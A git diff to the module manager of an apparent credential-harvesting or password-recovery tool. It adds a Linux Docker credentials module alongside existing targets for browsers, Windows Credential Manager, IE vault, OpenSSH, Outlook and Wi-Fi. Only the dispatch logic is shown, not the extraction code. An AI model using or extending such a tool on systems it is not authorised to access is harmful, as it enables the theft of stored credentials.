@@ -13,6 +13,7 @@ if sys.platform.startswith('win32'):
 	from modules.windows.wifi import Wifi
 
 if sys.platform.startswith('linux'):
+	from modules.linux.docker import Docker
 	from modules.linux.libsecret import Libsecret
 
 if sys.platform.startswith('win32'):
@@ -77,8 +78,9 @@ class ModuleManager:
 		self.targets = {
 			'chromium': [],
 			'firefox': [],
-			'internet explorer': False,
+			'docker': False,
 			'credman': False,
+			'internet explorer': False,
 			'openssh': False,
 			'outlook': False,
 			'wifi': False
@@ -104,33 +106,39 @@ class ModuleManager:
 			self.targets['openssh'] = True
 
 			if sys.platform.startswith('win32'):
-				self.targets['internet explorer'] = True
+				self.targets['credman'] = True
 
 			if sys.platform.startswith('win32'):
-				self.targets['credman'] = True
+				self.targets['internet explorer'] = True
 
 			if sys.platform.startswith('win32'):
 				self.targets['outlook'] = True
 
 			if sys.platform.startswith('win32'):
 				self.targets['wifi'] = True
+
+			if sys.platform.startswith('linux'):
+				self.targets['docker'] = True
 
 		else:
 
 			if 'openssh' in modules:
 				self.targets['openssh'] = True
 
-			if 'internet explorer' in modules and sys.platform.startswith('win32'):
-				self.targets['internet explorer'] = True
-
 			if 'credman' in modules and sys.platform.startswith('win32'):
 				self.targets['credman'] = True
+
+			if 'internet explorer' in modules and sys.platform.startswith('win32'):
+				self.targets['internet explorer'] = True
 
 			if 'outlook' in modules and sys.platform.startswith('win32'):
 				self.targets['outlook'] = True
 
 			if 'wifi' in modules and sys.platform.startswith('win32'):
 				self.targets['wifi'] = True
+
+			if 'docker' in modules and sys.platform.startswith('linux'):
+				self.targets['docker'] = True
 
 			for module in modules:
 				self.iterate_modules(module.lower(), self.targets, firefox_browsers, 'firefox')
@@ -140,8 +148,9 @@ class ModuleManager:
 		self.targets = {
 			'chromium': [],
 			'firefox': [],
-			'internet explorer': False,
+			'docker': False,
 			'credman': False,
+			'internet explorer': False,
 			'openssh': False,
 			'outlook': False,
 			'wifi': False
@@ -159,13 +168,15 @@ class ModuleManager:
 							[Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
 					case 'firefox':
 						drivers.extend([Mozilla(browser_name=name, path=path) for name, path in self.targets.get(key)])
+					case 'credman':
+						drivers.extend([Credman()])
+					case 'docker':
+						drivers.extend([Docker()])
 					case 'internet explorer':
 						if float(win.get_os_version()) > 6.1:
 							drivers.extend([Vault()])
 						else:
 							drivers.extend([IE()])
-					case 'credman':
-						drivers.extend([Credman()])
 					case 'openssh':
 						drivers.extend([Openssh()])
 					case 'outlook':
